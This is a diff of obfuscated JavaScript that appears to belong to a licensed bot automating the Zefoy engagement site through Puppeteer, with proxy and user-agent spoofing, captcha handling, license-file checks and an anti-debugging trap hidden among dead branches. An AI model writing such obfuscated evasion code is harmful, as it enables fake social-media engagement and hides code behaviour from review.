+    zLZZx: "1bO0R8D8vcv2d8i3Ya4bjap307W1v3ecw9Db7bw7kff5C0K6KeA6Z3D5PfY2A4S7Nbk9abnaG9X2n17enbabD356Aeqba0E",
+    WwKtW: "47fr4V7K0G9e9h206Z2oaB6YfcasbWad167f7ndn8S7Z6z6N3T1zdv5535bi2H2Cejc846dU4V1T3aacdu9n1W8hdEd6aHa",
+    SCVXv: "Fa29H0TbA8Pek86d7c06Add0M0Y7v3z9H9e8dbHeVdfbh6veads989NbW4j0r1Rab4w1rcxbV8R2E3Q371UdTbUey8a4x73",
+    LfUqJ: "aX3BeDaN6I3R192K6X5H4E6Wbr0WbU1B2h0zdc3g3F5jen4b95cHfv4W0x4Wdk769EeC6p5W41174CaL31bY8cds4z8l9Xe",
+    dXpHR: "Vf5bUcsb1293K82bLdJ0cfN5Zdyeu2N148ja09D83ea0C8o9ods8AcXbk3kfm4Efe685P98838kd61Q5L2eaR5rbIfj532u",
+    PCoMu: "dgfy5n49bc5W5dbafO7y9beNbh912T0reV028X1o2jdOaa7abJa47L4Ab45c7ubNbX8z3U0V0ddI8Gc25Seif45dafaD3r0",
+    omNUq: "Zce1za5f6bX8D1HbH069Tar5Tax570beu0E",
+    qjFqg: function (p1086, p1087) {
+      return p1086 !== p1087;
+    },
+    MOthM: "Mifcl",
+    eJQId: "VisYt"
+  };
+  const vV326 = v326;
+  try {
+    if (vV326.qjFqg(vV326.MOthM, vV326.eJQId)) {
+      const v327 = {
+        license: p995
+      };
+      await a0ic.promises.writeFile(v40, JSON.stringify(v327));
+    } else {
+      return vV326.uFbIH(vV326.LYFLT(vV326.YgAhx(vV326.zFBxO(vV326.enpQu(vV326.uFbIH(vV326.NjBva(vV326.NjBva(vV326.JIcvn(vV326.dBNFY(vV326.UrjjC(vV326.VcZOS(vV326.VcZOS(vV326.YgAhx(vV326.dBNFY(vV326.HlTxX(vV326.dBNFY(vV326.JIcvn(vV326.JIcvn(vV326.xcsfp(vV326.LQiEg(vV326.LQiEg(vV326.VcZOS(vV326.LQiEg(vV326.KVouv(vV326.dBNFY(vV326.enpQu(vV326.CNFEx(vV326.gEeIE(vV326.thEgO(vV326.enpQu(vV326.KVouv(vV326.VzYQq(vV326.pasyN(vV326.gEeIE(vV326.CNFEx(vV326.VzYQq(vV326.fgxmM(vV326.JIcvn(vV326.hMWKz(vV326.CNFEx(vV326.XdYFA(vV326.fgxmM(vV326.gEeIE(vV326.KVouv(vV326.UrjjC(vV326.gEeIE(vV326.pasyN(vV326.VcZOS(vV326.zFBxO(vV326.zFBxO(vV326.UfFXo(vV326.eoNTU(vV326.xcsfp(vV326.KMHWL(vV326.uFbIH(vV326.ckXoN(vV326.hMWKz(vV326.NjBva(vV326.xcsfp(vV326.fgxmM(vV326.XEMqp(vV326.cUVny(vV326.XEMqp(vV326.UfFXo(vV326.MfQOd(vV326.uFbIH(vV326.XdYFA(vV326.RBipU(vV326.zFBxO(vV326.gCqQl(vV326.JDqru(vV326.xIRQb(vV326.JIcvn(vV326.byTGD(vV326.ncTwb(vV326.kzajH(vV326.ncTwb(vV326.NjBva(vV326.jSMCn(vV326.FGfhw(vV326.aRQnd(vV326.RySUb(vV326.Awtql(vV326.ecnoz(vV326.kCNfB(vV326.eHBKb(vV326.DlKFf(vV326.ITCIZ, vV326.GzofT), vV326.ZIuXh), vV326.pmYji), vV326.oadzG), vV326.Nuoiz), vV326.eWyMW), vV326.txpGM), vV326.kkJle), vV326.FpUcp), vV326.woskp), vV326.tzPDJ), vV326.hMDXk), vV326.XwrVk), vV326.wirdD), vV326.lVJOa), vV326.chLOg), vV326.mtNbh), vV326.JbCuk), vV326.RSopG), vV326.KyQIw), vV326.UXJqD), vV326.qcUtL), vV326.UyYmx), vV326.EYzuX), vV326.wXjEK), vV326.WsWOA), vV326.OsaPP), vV326.NlwES), vV326.rIuOI), vV326.aBDkB), vV326.nsZIt), vV326.hGEAP), vV326.nQqUe), vV326.wyeYf), vV326.MSrie), vV326.aERjX), vV326.sinVL), vV326.CyNvi), vV326.WPEXc), vV326.rcpeB), vV326.mAoQn), vV326.tAZpH), vV326.uDXlU), vV326.pkfNw), vV326.tpkXu), vV326.VDXMk), vV326.OniwU), vV326.ORBvN), vV326.ECmsq), vV326.STxsd), vV326.syfvn), vV326.PKYTq), vV326.BufYG), vV326.JvMny), vV326.koOdj), vV326.MVabu), vV326.QMUcR), vV326.qEERL), vV326.jicaO), vV326.thbwq), vV326.KOTns), vV326.ncxjX), vV326.flKnv), vV326.QCnPP), vV326.tTqjJ), vV326.TPzTy), vV326.bhZUe), vV326.VMZra), vV326.wEDxu), vV326.cXzuw), vV326.lOKpr), vV326.tFNlP), vV326.dCZDX), vV326.zBYWe), vV326.pNHGJ), vV326.CtAgT), vV326.XqHFx), vV326.aqiXh), vV326.obbkc), vV326.nHinO), vV326.PoDdp), vV326.zLZZx), vV326.WwKtW), vV326.SCVXv), vV326.LfUqJ), vV326.dXpHR), vV326.PCoMu), vV326.omNUq);
+    }
+  } catch (w) {}
+}
+async function f36() {
+  const v328 = {
+    mocFa: function (p1088, p1089) {
+      return p1088 + p1089;
+    },
+    KpBPO: "debu",
+    EBWKy: "gger",
+    RLoeS: "stateObject",
+    JLTml: function (p1090, p1091) {
+      return p1090 === p1091;
+    },
+    sKFhr: "dWZJc",
+    LYvhq: "qsknW",
+    FwdMX: function (p1092, p1093) {
+      return p1092 !== p1093;
+    },
+    zGUez: "AbJgV"
+  };
+  const vV328 = v328;
+  try {
+    if (vV328.JLTml(vV328.sKFhr, vV328.LYvhq)) {
+      (function () {
+        return false;
+      }).constructor(eWdimx.mocFa(eWdimx.KpBPO, eWdimx.EBWKy)).apply(eWdimx.RLoeS);
+    } else {
+      const v329 = await a0ic.promises.readFile(v40);
+      let v330 = JSON.parse(v329);
+      return v330.license;
+    }
+  } catch (z) {
+    if (vV328.FwdMX(vV328.zGUez, vV328.zGUez)) {
+      H = c.get(a);
     } else {
       return false;
     }
   }
 }
-async function f36() {
-  const v327 = {
-    kcTXK: function (p967, p968) {
-      return p967 === p968;
+async function f37() {
+  const v331 = {
+    zcxJs: "./ubuntu-update.sh",
+    JkHRM: function (p1094, p1095) {
+      return p1094 !== p1095;
     },
-    QxESq: "bONMi",
-    FtoMW: function (p969, p970) {
-      return p969(p970);
+    MEdXn: "nspFo",
+    NOuQV: "HFrKf",
+    xQBKw: function (p1096, p1097) {
+      return p1096(p1097);
     }
   };
   if (v95) {
     return;
   }
   try {
-    if (v327.kcTXK(v327.QxESq, v327.QxESq)) {
-      v80 = await v327.FtoMW(f37, false);
-      const v328 = (await v80.pages())[0];
-      await v328.goto(v53, {
+    if (v331.JkHRM(v331.MEdXn, v331.NOuQV)) {
+      v78 = await v331.xQBKw(f38, false);
+      const v332 = (await v78.pages())[0];
+      await v332.goto(v51, {
         timeout: 0
       });
     } else {
-      N.stdout.clearLine(0);
-      C.stdout.cursorTo(0);
-      S.stdout.write(t + " Wrong captcha! (" + V + ")");
+      v331.log(v331.zcxJs);
     }
-  } catch (N) {}
+  } catch (a) {}
 }
-async function f37(p971 = true) {
-  const v330 = {
-    PDZWe: function (p972, p973) {
-      return p972(p973);
+async function f38(p1098 = true) {
+  const v336 = {
+    BjJuV: function (p1099, p1100) {
+      return p1099(p1100);
     },
-    kOdfr: "--disable-gpu",
-    lSwNk: "--disable-gpu-compositing",
-    GWtuw: function (p974, p975) {
-      return p974(p975);
+    EwslG: function (p1101, p1102) {
+      return p1101(p1102);
     },
-    aJrdA: function (p976, p977) {
-      return p976 + p977;
+    jRkTg: "No comments found",
+    powAJ: function (p1103, p1104) {
+      return p1103(p1104);
     },
-    PEaHP: "Executable not found in the following path:\n",
-    ZhgfE: "Use the -b flag to set the path to the browser.",
-    ekerH: function (p978, p979) {
-      return p978 && p979;
+    qVYKz: function (p1105, p1106) {
+      return p1105(p1106);
     },
-    KkKgL: function (p980, p981) {
-      return p980 === p981;
+    YoEFZ: function (p1107, p1108) {
+      return p1107 + p1108;
     },
-    Glgxg: "vXTnQ",
-    ISNmg: function (p982, p983) {
-      return p982 !== p983;
+    mFxTG: " LICENSE IS VERIFIED!",
+    LoihY: function (p1109, p1110) {
+      return p1109 && p1110;
     },
-    fOseP: "WxaGD",
-    cxLMB: function (p984, p985) {
-      return p984(p985);
+    pZxlL: function (p1111, p1112) {
+      return p1111 !== p1112;
     },
-    dXVeU: function (p986, p987) {
-      return p986(p987);
+    fzVNf: "MIRWq",
+    HeuXF: function (p1113, p1114) {
+      return p1113 + p1114;
     },
-    wHToJ: function (p988, p989) {
-      return p988 !== p989;
+    hiDXf: "TOjDh",
+    jNzuQ: "tvnWO",
+    YBiSi: "WBdpA",
+    tAYDA: "KRUXa",
+    mkgBb: "Executable not found in the following path:\n",
+    piJWl: "Use the -b flag to set the path to the browser.",
+    WKVDB: function (p1115, p1116) {
+      return p1115 !== p1116;
     },
-    wyiKz: "cSYfo",
-    STryq: function (p990, p991) {
-      return p990 && p991;
+    kPUfd: "ObNrS",
+    TLmZk: function (p1117, p1118) {
+      return p1117(p1118);
     },
-    sUXEv: "vAAvW",
-    zdflm: function (p992, p993) {
-      return p992 + p993;
+    ZURZR: "dhkAi",
+    WvfNE: function (p1119) {
+      return p1119();
     },
-    HDMEd: function (p994, p995) {
-      return p994 === p995;
+    eQIQU: function (p1120, p1121) {
+      return p1120 === p1121;
     },
-    LnFIv: "CGAxq",
-    StvbN: "YBshR",
-    fPgQd: function (p996, p997) {
-      return p996 === p997;
+    lglGo: "QgjVQ",
+    dtGYP: function (p1122, p1123) {
+      return p1122 + p1123;
     },
-    BTmCY: "UrtHA",
-    ArgrT: "hYpGW",
-    VOAZM: function (p998) {
-      return p998();
+    HVOEi: " UA: ",
+    PZmuh: "wtWUQ",
+    VddfW: function (p1124, p1125) {
+      return p1124(p1125);
     },
-    JNTgs: function (p999, p1000) {
-      return p999 && p1000;
+    GDBmW: "--no-sandbox",
+    nRJUX: "--window-size=900,900",
+    WjLYb: "--window-position=80,60",
+    Cdqmy: function (p1126, p1127) {
+      return p1126 + p1127;
     },
-    MkXKz: "bsVYE",
-    BoLAK: function (p1001, p1002) {
-      return p1001 + p1002;
+    XxEwa: "--user-agent=",
+    IFOFt: function (p1128, p1129) {
+      return p1128 + p1129;
     },
-    SMXYh: " UA: ",
-    UGFcM: function (p1003, p1004) {
-      return p1003 !== p1004;
+    XCYTE: "--proxy-server=",
+    nwZEH: function (p1130, p1131) {
+      return p1130 !== p1131;
     },
-    eqsFT: "EShnk",
-    dVXdc: "--no-sandbox",
-    snHii: "--window-size=900,900",
-    uzUYe: "--window-position=80,60",
-    JhJDI: "--user-agent=",
-    PamWt: function (p1005, p1006) {
-      return p1005 + p1006;
+    VjwpA: "KNvQS",
+    CZfVE: "--disable-gpu",
+    WZyrW: "--disable-gpu-compositing",
+    IAqVJ: function (p1132, p1133) {
+      return p1132 && p1133;
     },
-    xoJwK: "--proxy-server=",
-    LkaDJ: "RqpQD",
-    JTPhv: "oZayh",
-    rFpuY: function (p1007, p1008) {
-      return p1007 !== p1008;
+    NHaKt: "WamZD",
+    ztEkH: "askxl",
+    xjWZk: function (p1134, p1135) {
+      return p1134 + p1135;
     },
-    rSsku: "SfyGK",
-    SiWOZ: "hoGAJ",
-    lbYzU: function (p1009, p1010) {
-      return p1009(p1010);
+    tmVNj: "browser-remote",
+    EKhGt: "oSecW",
+    DCqqH: "moXAO",
+    AeZaX: "HEFbR",
+    MWtwQ: "browser-user",
+    yvhwY: function (p1136, p1137) {
+      return p1136 && p1137;
     },
-    addqm: "browser-remote",
-    xQDsr: function (p1011, p1012) {
-      return p1011 === p1012;
+    YFqVD: function (p1138, p1139) {
+      return p1138 !== p1139;
     },
-    kFybh: "DvNIn",
-    rbsqX: "qxOCt",
-    IAOpl: "pQxGB",
-    GBUah: "ecOdE",
-    PgpSx: "browser-user",
-    cNieL: "jiKEu"
+    fThhv: "tvWvq"
   };
-  const v331 = vA0zS.browser || a0zC.executablePath();
-  if (v330.ekerH(!v26, !v29)) {
-    if (v330.KkKgL(v330.Glgxg, v330.Glgxg)) {
+  const v337 = vA0iw.browser || a0iz.executablePath();
+  if (v336.LoihY(!v28, !v31)) {
+    if (v336.pZxlL(v336.fzVNf, v336.fzVNf)) {
+      [v336, v337] = vV80.get(v341);
+    } else {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v330.aJrdA(v59, " Check browser (" + v331.substring(0, 34) + ")..."));
-    } else {
-      y = p971;
+      process.stdout.write(v336.HeuXF(v57, " Check browser (" + v337.substring(0, 34) + ")..."));
     }
-  } else if (v330.ISNmg(v330.fOseP, v330.fOseP)) {
-    y.stdout.moveCursor(0, -23);
-    p971.stdout.clearScreenDown();
+  } else if (v336.pZxlL(v336.hiDXf, v336.hiDXf)) {
+    P = "[32m+" + p1098 + "[0m";
   } else {
-    v330.cxLMB(f53, "Check browser (" + v331 + ")...");
+    v336.BjJuV(f54, "Check browser (" + v337 + ")...");
   }
-  await v330.dXVeU(f52, 300);
-  if (await v330.PDZWe(f62, v331)) {} else if (v330.wHToJ(v330.wyiKz, v330.wyiKz)) {
-    y.stdout.moveCursor(0, -2);
-    p971.stdout.clearScreenDown();
-  } else {
-    if (v330.STryq(!v26, !v29)) {
-      if (v330.ISNmg(v330.sUXEv, v330.sUXEv)) {
-        Y.exit(0);
+  await v336.powAJ(f53, 300);
+  if (await v336.BjJuV(f63, v337)) {} else if (v336.pZxlL(v336.jNzuQ, v336.YBiSi)) {
+    if (v336.LoihY(!v28, !v31)) {
+      if (v336.pZxlL(v336.tAYDA, v336.tAYDA)) {
+        fDyOPc.BjJuV(s, "0");
       } else {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v330.zdflm(v62, " Chrome/Chromium executable is invalid!"));
-        console.info("\n\n", v330.PEaHP, "\"" + v331 + "\"\n", v330.ZhgfE);
+        process.stdout.write(v336.YoEFZ(v60, " Chrome/Chromium executable is invalid!"));
+        console.info("\n\n", v336.mkgBb, "\"" + v337 + "\"\n", v336.piJWl);
       }
-    } else if (v330.HDMEd(v330.LnFIv, v330.StvbN)) {
-      if (v330) {
-        const v332 = v337.apply(v338, arguments);
-        I = null;
-        return v332;
-      }
+    } else if (v336.WKVDB(v336.kPUfd, v336.kPUfd)) {
+      v336.EwslG(v341, "[" + v342 + "] " + v343 + " (+" + C + ") " + J);
+      v336.EwslG(D, l);
     } else {
-      v330.PDZWe(f53, "Chrome/Chromium executable is invalid!");
+      v336.TLmZk(f54, "Chrome/Chromium executable is invalid!");
     }
     process.exit(0);
-  }
-  await v330.dXVeU(f52, 300);
-  if (a0zd.existsSync(v93)) {
-    if (v330.fPgQd(v330.BTmCY, v330.ArgrT)) {
-      v330.PDZWe(Y, "Zefoy is accessible! :)");
-    } else {
-      const v333 = await v330.VOAZM(f31);
-      const v334 = v333.find(p1013 => p1013.name === "user_agent");
-      v77 = v334 ? v330.GWtuw(decodeURIComponent, v334.value) : v77;
-      const v335 = v333.find(p1014 => p1014.name === "bt_proxy");
-      v82 = v335?.value || v82;
-    }
-  }
-  let vV82 = v82;
-  let v336 = await v330.cxLMB(f49, v82);
-  if (v330.JNTgs(!v26, !v29)) {
-    if (v330.wHToJ(v330.MkXKz, v330.MkXKz)) {
-      return null;
-    } else {
-      process.stdout.clearLine(0);
-      process.stdout.cursorTo(0);
-      process.stdout.write(v330.aJrdA(v330.BoLAK(v59, v330.SMXYh), v77.substring(0, 48)));
-    }
-  } else if (v330.UGFcM(v330.eqsFT, v330.eqsFT)) {
-    v330.PDZWe(v336, "[" + v337 + "] " + v338 + " (+" + I + ") " + U);
-    v330.PDZWe(B, r);
   } else {
-    v330.PDZWe(f53, "UA: " + v77);
+    s = v336.jRkTg;
   }
-  let v337 = [v330.dVXdc, v330.snHii, v330.uzUYe, v330.zdflm(v330.JhJDI, v77), v330.PamWt(v330.xoJwK, vV82)];
-  if (v35) {
-    if (v330.wHToJ(v330.LkaDJ, v330.JTPhv)) {
-      v337 = [...v337, v330.kOdfr, v330.lSwNk];
+  await v336.qVYKz(f53, 300);
+  if (a0ic.existsSync(v93)) {
+    if (v336.pZxlL(v336.ZURZR, v336.ZURZR)) {
+      v336.stdout.clearLine(0);
+      v337.stdout.cursorTo(0);
+      vV80.stdout.write(v341 + " Stopped for reaching the maximum time limit!");
     } else {
-      v330.stdout.clearLine(0);
-      v331.stdout.cursorTo(0);
-      vV82.stdout.write(v336 + " Stopped for not accumulating the defined minimum!");
+      const v338 = await v336.WvfNE(f32);
+      const v339 = v338.find(p1140 => p1140.name === "user_agent");
+      v75 = v339 ? v336.TLmZk(decodeURIComponent, v339.value) : v75;
+      const v340 = v338.find(p1141 => p1141.name === "bt_proxy");
+      v80 = v340?.value || v80;
     }
   }
-  if (v330.ekerH(!v26, !v29)) {
-    if (v330.rFpuY(v330.rSsku, v330.SiWOZ)) {
+  let vV80 = v80;
+  let v341 = await v336.qVYKz(f50, v80);
+  if (v336.LoihY(!v28, !v31)) {
+    if (v336.eQIQU(v336.lglGo, v336.lglGo)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v330.aJrdA(v59, vV82 ? " Launch browser (proxy: " + vV82 + " [" + v336 + "])..." : " Launch browser..."));
-      await v330.dXVeU(f52, 300);
+      process.stdout.write(v336.dtGYP(v336.HeuXF(v57, v336.HVOEi), v75.substring(0, 48)));
     } else {
-      y = [...p971, v330.kOdfr, v330.lSwNk];
+      s = "";
+    }
+  } else if (v336.pZxlL(v336.PZmuh, v336.PZmuh)) {
+    P.stdout.moveCursor(0, -1);
+    p1098.stdout.clearScreenDown();
+  } else {
+    v336.VddfW(f54, "UA: " + v75);
+  }
+  let v342 = [v336.GDBmW, v336.nRJUX, v336.WjLYb, v336.Cdqmy(v336.XxEwa, v75), v336.IFOFt(v336.XCYTE, vV80)];
+  if (v33) {
+    if (v336.nwZEH(v336.VjwpA, v336.VjwpA)) {
+      v336.stdout.clearLine(0);
+      v337.stdout.cursorTo(0);
+      vV80.stdout.write(v341 + "  Check proxies...");
+    } else {
+      v342 = [...v342, v336.CZfVE, v336.WZyrW];
     }
   }
-  v330.lbYzU(f53, vV82 ? "Launch browser (proxy: " + vV82 + " [" + v336 + "])..." : "Launch browser...");
-  let v338;
-  if (vA0zS[v330.addqm]) {
-    if (v330.xQDsr(v330.kFybh, v330.rbsqX)) {
-      try {
-        const v339 = v330.GWtuw(vV82, v336);
-        if (!v339.ok) {
-          return null;
-        }
-        const v340 = v339.text();
-        return v340;
-      } catch (o) {
-        v330.GWtuw(v338, o);
-        return null;
-      }
+  if (v336.IAqVJ(!v28, !v31)) {
+    if (v336.eQIQU(v336.NHaKt, v336.ztEkH)) {
+      v336.stdout.clearLine(0);
+      v337.stdout.cursorTo(0);
+      vV80.stdout.write(v341 + " The captcha is blocked and cannot be accessed!");
     } else {
-      const v341 = {
-        browserWSEndpoint: vA0zS[v330.addqm]
+      process.stdout.clearLine(0);
+      process.stdout.cursorTo(0);
+      process.stdout.write(v336.xjWZk(v57, vV80 ? " Launch browser (proxy: " + vV80 + " [" + v341 + "])..." : " Launch browser..."));
+      await v336.BjJuV(f53, 300);
+    }
+  }
+  v336.powAJ(f54, vV80 ? "Launch browser (proxy: " + vV80 + " [" + v341 + "])..." : "Launch browser...");
+  let v343;
+  if (vA0iw[v336.tmVNj]) {
+    if (v336.eQIQU(v336.EKhGt, v336.EKhGt)) {
+      const v344 = {
+        browserWSEndpoint: vA0iw[v336.tmVNj]
       };
-      v338 = await a0zC.connect(v341);
+      v343 = await a0iz.connect(v344);
+    } else {
+      v336.powAJ(v341, "[" + v342 + "] " + v343 + " (+" + C + ") " + J);
+      v336.powAJ(D, l);
     }
-  } else if (v330.HDMEd(v330.IAOpl, v330.GBUah)) {
-    v330.GWtuw(Y, "Zefoy is unreachable or blocked! (you need proxy/vpn)");
+  } else if (v336.eQIQU(v336.DCqqH, v336.AeZaX)) {
+    v336.qVYKz(P, "Wrong captcha! (" + p1098 + ")");
   } else {
-    const v343 = {
-      headless: p971,
-      args: v337,
+    const v346 = {
+      headless: p1098,
+      args: v342,
       defaultViewport: {
         width: 900,
         height: 900
       },
-      executablePath: vA0zS.browser,
-      userDataDir: vA0zS[v330.PgpSx]
+      executablePath: vA0iw.browser,
+      userDataDir: vA0iw[v336.MWtwQ]
     };
-    v338 = await a0zC.launch(v343);
+    v343 = await a0iz.launch(v346);
   }
-  if (v330.STryq(!v26, !v29)) {
-    if (v330.rFpuY(v330.cNieL, v330.cNieL)) {
-      vV82.stdout.clearLine(0);
-      v336.stdout.cursorTo(0);
-      v337.stdout.write(v330.aJrdA(v338, " Chrome/Chromium executable is invalid!"));
-      I.info("\n\n", v330.PEaHP, "\"" + U + "\"\n", v330.ZhgfE);
+  if (v336.yvhwY(!v28, !v31)) {
+    if (v336.YFqVD(v336.fThhv, v336.fThhv)) {
+      v336.stdout.clearLine(0);
+      v337.stdout.cursorTo(0);
+      vV80.stdout.write(v336.YoEFZ(v341, v336.mFxTG));
     } else {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
     }
   }
-  return v338;
+  return v343;
 }
-async function f38(p1015 = true) {
-  const v344 = {
-    umYxl: function (p1016, p1017) {
-      return p1016(p1017);
+async function f39(p1142 = true) {
+  const v347 = {
+    JQHQD: function (p1143) {
+      return p1143();
     },
-    senEj: "eng",
-    aaAWZ: function (p1018, p1019) {
-      return p1018(p1019);
+    YFRgh: function (p1144, p1145) {
+      return p1144 / p1145;
     },
-    wSQLj: function (p1020, p1021) {
-      return p1020 < p1021;
+    XKwqH: function (p1146) {
+      return p1146();
     },
-    pwIJI: function (p1022, p1023) {
-      return p1022 < p1023;
+    wRfTa: function (p1147, p1148) {
+      return p1147 < p1148;
     },
-    mKKkB: function (p1024, p1025) {
-      return p1024 + p1025;
+    KJNAa: function (p1149, p1150) {
+      return p1149(p1150);
     },
-    NSvtU: function (p1026, p1027) {
-      return p1026 + p1027;
+    QnQIG: function (p1151, p1152) {
+      return p1151 ^ p1152;
     },
-    YdqfS: function (p1028, p1029) {
-      return p1028 + p1029;
+    GxggX: function (p1153, p1154, p1155) {
+      return p1153(p1154, p1155);
     },
-    YFLfR: function (p1030, p1031) {
-      return p1030 + p1031;
+    SQBEG: function (p1156, p1157) {
+      return p1156(p1157);
     },
-    IkSpr: function (p1032, p1033) {
-      return p1032(p1033);
+    pzoiN: function (p1158, p1159) {
+      return p1158(p1159);
     },
-    DrNID: function (p1034) {
-      return p1034();
+    zcFwC: "eng",
+    yZGcL: function (p1160, p1161) {
+      return p1160(p1161);
     },
-    msctG: function (p1035, p1036) {
-      return p1035 / p1036;
+    VpDHQ: function (p1162) {
+      return p1162();
     },
-    tTcQD: function (p1037) {
-      return p1037();
+    HXnjU: function (p1163, p1164) {
+      return p1163(p1164);
     },
-    zRgQt: function (p1038, p1039) {
-      return p1038 < p1039;
+    aNDAR: function (p1165, p1166) {
+      return p1165(p1166);
     },
-    lpfUn: function (p1040, p1041) {
-      return p1040 + p1041;
+    ZKuGP: function (p1167, p1168) {
+      return p1167(p1168);
     },
-    KCPSE: "debu",
-    fSFrn: "gger",
-    qxvRv: "action",
-    lvVKL: function (p1042, p1043) {
-      return p1042 && p1043;
+    KPiHx: function (p1169, p1170) {
+      return p1169(p1170);
     },
-    bBfJv: function (p1044, p1045) {
-      return p1044 !== p1045;
+    OSzuJ: function (p1171, p1172) {
+      return p1171 === p1172;
     },
-    usktD: "vkYkZ",
-    cRweB: function (p1046, p1047) {
-      return p1046 !== p1047;
+    aolYc: function (p1173, p1174) {
+      return p1173 - p1174;
     },
-    MWkYH: "iFDYl",
-    HFmko: "oKbtY",
-    TYaTI: function (p1048, p1049) {
-      return p1048(p1049);
+    wXNRp: function (p1175, p1176) {
+      return p1175(p1176);
     },
-    nKHGE: "utf8",
-    mWhIP: "wfzob",
-    TCUTi: function (p1050, p1051) {
-      return p1050(p1051);
+    WCBba: "...",
+    rkSIY: function (p1177, p1178) {
+      return p1177(p1178);
     },
-    dJRHc: "WTpBB",
-    oSuXN: "xvxzB",
-    YGkAd: function (p1052, p1053) {
-      return p1052 === p1053;
+    CfCnT: function (p1179, p1180) {
+      return p1179(p1180);
     },
-    OpmJN: "lVRjW",
-    igpvn: "luJDz",
-    AGgrm: "seZuZ",
-    lxOUp: "xGTMM",
-    doRGm: function (p1054, p1055) {
-      return p1054 === p1055;
+    ottAr: function (p1181, p1182) {
+      return p1181 < p1182;
     },
-    OpSlY: "QKKCn",
-    tMnJm: function (p1056, p1057) {
-      return p1056 !== p1057;
+    wWBsN: function (p1183, p1184) {
+      return p1183 ^ p1184;
     },
-    zJExF: "yCiwr",
-    BNHrX: "uUQch",
-    NWJOY: function (p1058, p1059, p1060) {
-      return p1058(p1059, p1060);
+    qPXUX: function (p1185, p1186) {
+      return p1185 && p1186;
     },
-    EbptA: "xGbmX",
-    AQeQE: "SYzoT",
-    pqoEN: function (p1061, p1062) {
-      return p1061 && p1062;
+    uRbNZ: function (p1187, p1188) {
+      return p1187 === p1188;
     },
-    XGRoG: function (p1063, p1064) {
-      return p1063 !== p1064;
+    DdrDU: "UcyfM",
+    GeZcD: "HWKIe",
+    LVWgv: function (p1189, p1190) {
+      return p1189 === p1190;
     },
-    zRSMl: "iJmEi",
-    HJzLX: "fUTSx",
-    oPdkj: "fXvxx",
-    IwMrz: function (p1065, p1066) {
-      return p1065(p1066);
+    MXIOB: "KecDh",
+    ROVEX: "OHkuj",
+    JucqP: function (p1191, p1192) {
+      return p1191(p1192);
     },
-    estUU: function (p1067, p1068) {
-      return p1067 === p1068;
+    KvPfP: "utf8",
+    FDLCB: function (p1193, p1194) {
+      return p1193 < p1194;
     },
-    kPQBX: "YxALx",
-    MJQdD: "vQEWJ",
-    HDcZM: function (p1069, p1070) {
-      return p1069 === p1070;
+    tKFgb: function (p1195, p1196) {
+      return p1195 !== p1196;
     },
-    iBCwT: "JLxdx",
-    EDXfT: function (p1071, p1072) {
-      return p1071(p1072);
+    TVagN: "oyhtE",
+    LevvY: function (p1197, p1198) {
+      return p1197(p1198);
     },
-    JsdmJ: function (p1073, p1074) {
-      return p1073 === p1074;
+    GBVQc: function (p1199, p1200) {
+      return p1199 !== p1200;
     },
-    NeIFH: "TSYoL",
-    gfSgV: "KYuKF",
-    nQMdA: "ltvSy",
-    BMEQn: "ZESah",
-    bTiKt: function (p1075, p1076) {
-      return p1075 !== p1076;
+    VeEUW: "KlhKf",
+    SDRBq: function (p1201, p1202) {
+      return p1201 !== p1202;
     },
-    sOUSy: "iCCCO",
-    OJNkR: "elIfW",
-    QpXsD: "TUoxf",
-    GRRQv: "ujUls",
-    jPBrb: function (p1077, p1078) {
-      return p1077(p1078);
+    IFvrh: "lwxcM",
+    urNbh: "ETfIR",
+    hDLrK: "NLRyF",
+    vAYSC: function (p1203, p1204) {
+      return p1203 !== p1204;
     },
-    TGzTp: function (p1079, p1080) {
-      return p1079 !== p1080;
+    WqzMp: "mqzBQ",
+    TbQkD: function (p1205, p1206) {
+      return p1205(p1206);
     },
-    FziUd: "AQwoB",
-    xHUKb: "SUqPK",
-    QmFOe: function (p1081, p1082) {
-      return p1081(p1082);
+    apBjx: function (p1207, p1208) {
+      return p1207 === p1208;
     },
-    eGfja: function (p1083, p1084) {
-      return p1083 >= p1084;
+    IQhov: "NKKrA",
+    IUFfK: "ShWFT",
+    IcIpB: function (p1209, p1210) {
+      return p1209(p1210);
     },
-    Fvrcy: "aTsbo",
-    XIBSM: function (p1085, p1086) {
-      return p1085 === p1086;
+    PLQcQ: function (p1211, p1212, p1213) {
+      return p1211(p1212, p1213);
     },
-    fhfVA: "LXuhl",
-    jDWfg: function (p1087, p1088) {
-      return p1087(p1088);
+    zATlI: function (p1214, p1215) {
+      return p1214 !== p1215;
     },
-    gmxnI: "DskPj"
+    oOMjR: "DeCMV",
+    mCLhU: "cjzTy",
+    shXEM: "yFUIA",
+    tbQjg: function (p1216, p1217) {
+      return p1216(p1217);
+    },
+    MpNqR: "AoXgs",
+    PxXXP: "kaFtj",
+    RdCSY: function (p1218, p1219) {
+      return p1218(p1219);
+    },
+    zbNmr: "dOiNj",
+    BUbAW: "KayrZ",
+    gCbrI: function (p1220, p1221) {
+      return p1220 !== p1221;
+    },
+    iPDyb: "qbQyq",
+    UEFCb: "qTpYx",
+    ehcgI: function (p1222, p1223) {
+      return p1222(p1223);
+    },
+    WGRfJ: "xHrIS",
+    pkjco: function (p1224, p1225) {
+      return p1224(p1225);
+    },
+    sJJVV: function (p1226, p1227) {
+      return p1226 !== p1227;
+    },
+    MasOA: "XRRxa",
+    QGFxO: function (p1228, p1229) {
+      return p1228 && p1229;
+    },
+    Grvgf: function (p1230, p1231) {
+      return p1230 !== p1231;
+    },
+    bURhQ: "QioZf",
+    TptAN: function (p1232, p1233) {
+      return p1232 !== p1233;
+    },
+    xmdfp: "eBjtb",
+    kLzra: "nzgxH",
+    vdVeW: function (p1234, p1235) {
+      return p1234(p1235);
+    },
+    YvIzt: "iTBqs",
+    uBBXC: "JMZXA",
+    iLCNE: function (p1236, p1237) {
+      return p1236(p1237);
+    },
+    ZSbYO: function (p1238, p1239) {
+      return p1238 >= p1239;
+    },
+    ldmTB: "qIXvP",
+    TyAEM: "pVtpN",
+    JQVgv: "IrHnU",
+    nhaOn: "cBbyl",
+    DgdhF: function (p1240, p1241) {
+      return p1240(p1241);
+    }
   };
-  if (v344.lvVKL(!v26, !v29)) {
-    if (v344.bBfJv(v344.usktD, v344.usktD)) {
-      const v345 = {
-        HcKXI: function (p1089, p1090) {
-          return v344.umYxl(p1089, p1090);
-        },
